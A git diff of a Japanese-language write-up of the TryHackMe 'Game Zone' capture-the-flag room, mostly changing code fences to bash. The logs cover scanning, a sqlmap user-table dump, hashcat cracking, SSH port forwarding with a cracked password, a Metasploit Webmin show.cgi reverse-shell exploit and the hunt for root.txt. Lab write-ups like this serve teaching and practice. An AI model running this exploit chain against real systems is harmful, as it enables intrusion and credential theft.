@@ -33,14 +33,10 @@ High-quality reconnaissance narrows a large attack surface into a few validated 
 
 ### Not implemented (or log not saved)
 
-```
 
 ## Nmap
-```
+```bash
 nmap -p- -sC -sV -T4 -A -Pn $ip
-```
-
-```
 ✅[0:21][CPU:1][MEM:52][IP:10.11.87.75][/home/n0z0]
 🐉 > nmap -p- -sC -sV -T4 -A -Pn $ip
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-25 00:22 JST
@@ -88,7 +84,7 @@ Nmap done: 1 IP address (1 host up) scanned in 814.41 seconds
 
 ### 実施ログ（統合）
 
-```
+```bash
 ✅[0:21][CPU:1][MEM:52][IP:10.11.87.75][/home/n0z0]
 🐉 > nmap -p- -sC -sV -T4 -A -Pn $ip
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-25 00:22 JST
@@ -130,7 +126,7 @@ Nmap done: 1 IP address (1 host up) scanned in 814.41 seconds
 
 22と80だけ開いてた
 
-```
+```bash
 ✅[0:20][CPU:1][MEM:52][IP:10.11.87.75][/home/n0z0]
 🐉 > feroxbuster -u http://$ip -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 100 -x php,html,txt -r --timeout 3 --no-state -s 200,301 -e -E
 
@@ -174,7 +170,7 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
 
 脆弱性のスキャン
 
-```
+```bash
 ❌[0:23][CPU:1][MEM:50][IP:10.11.87.75][/home/n0z0]
 🐉 > nikto -h $ip -Tuning 123456789
 - Nikto v2.5.0
@@ -222,7 +218,7 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
 
 sqlmapが自動でスキャンしてくれる。
 
-```
+```bash
 ✅[15:05][CPU:1][MEM:50][IP:10.11.87.75][...e/n0z0/work/thm/Game_Zone]
 🐉 > sqlmap -r request4.txt --dbms=mysql --dump
         ___
@@ -308,7 +304,7 @@ Table: users
 
 hash-identifierでどのハッシュが使われているか確認する
 
-```
+```bash
 ✅[17:19][CPU:1][MEM:50][IP:10.11.87.75][...e/n0z0/work/thm/Game_Zone]
 🐉 > hash-identifier
 /usr/share/hash-identifier/hash-id.py:13: SyntaxWarning: invalid escape sequence '\ '
@@ -350,7 +346,7 @@ Least Possible Hashs:
 
 ちなみにこのハッシュ `ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14` は64文字の16進数であり、一般的に **SHA-256** に該当する
 
-```
+```bash
 ❌[17:18][CPU:1][MEM:50][IP:10.11.87.75][...e/n0z0/work/thm/Game_Zone]
 🐉 > hashcat -m 1400 ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 /usr/share/wordlists/rockyou.txt
 hashcat (v6.2.6) starting
@@ -437,7 +433,7 @@ tcp    LISTEN     0      128                 :::22                              
 
 サーバの
 
-```
+```bash
 ❌[17:52][CPU:1][MEM:50][IP:10.11.87.75][/home/n0z0]
 🐉 > ssh -L 10000:localhost:10000 agent47@$ip
 agent47@10.10.139.187's password:
@@ -453,9 +449,6 @@ Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)
 68 updates are security updates.
 
 Last login: Sun Oct 27 03:02:47 2024 from 10.11.87.75
-```
-
-```
 +---------------+                            +-------------------+
 | Local machine | | Remote server |
 | localhost     |                            | 192.168.1.1       |
@@ -492,7 +485,7 @@ localhost:10000に接続するとwebmin使っていることがわかる
 
 webminの脆弱性を検索すると一番上にそれっぽいのが出てくる
 
-```
+```bash
 ❌[21:09][CPU:1][MEM:54][IP:10.11.87.75][/home/n0z0]
 🐉 > searchsploit webmin 1.580
 -------------------------------------------------------------------- ---------------------------------
@@ -507,7 +500,7 @@ Papers: No Results
 
 show.cgiが使われている脆弱性を見つけた
 
-```
+```bash
 msf6 > search webmin
 
 Matching Modules
@@ -558,7 +551,7 @@ Exploit target:
 
 リバースプロキシしたいから6を選択する
 
-```
+```bash
 msf6 exploit(unix/webapp/webmin_show_cgi_exec) > show payloads
 
 Compatible Payloads
@@ -583,9 +576,6 @@ Compatible Payloads
    14  payload/cmd/unix/reverse_ssl_double_telnet  .                normal  No     Unix Command Shell, Double Reverse TCP SSL (telnet)
 
 msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set payloads 6
-```
-
-```
 msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set PASSWORD videogamer124
 PASSWORD => videogamer124
 msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set RHOSTS localhost
@@ -597,16 +587,12 @@ msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set USERNAME agent47
 USERNAME => agent47
 msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set LHOST tun0
 LHOST => 10.11.87.75
-```
-
-```
 python -c 'import pty; pty.spawn("/bin/bash")'
 root@gamezone:/usr/share/webmin/file/#
 ```
 
 rootフラグ取得
 
-```
 root@gamezone:/usr/share/webmin/file/# find / -iname root.txt 2>/dev/null
 find / -iname root.txt 2>/dev/null
 /root/root.txt
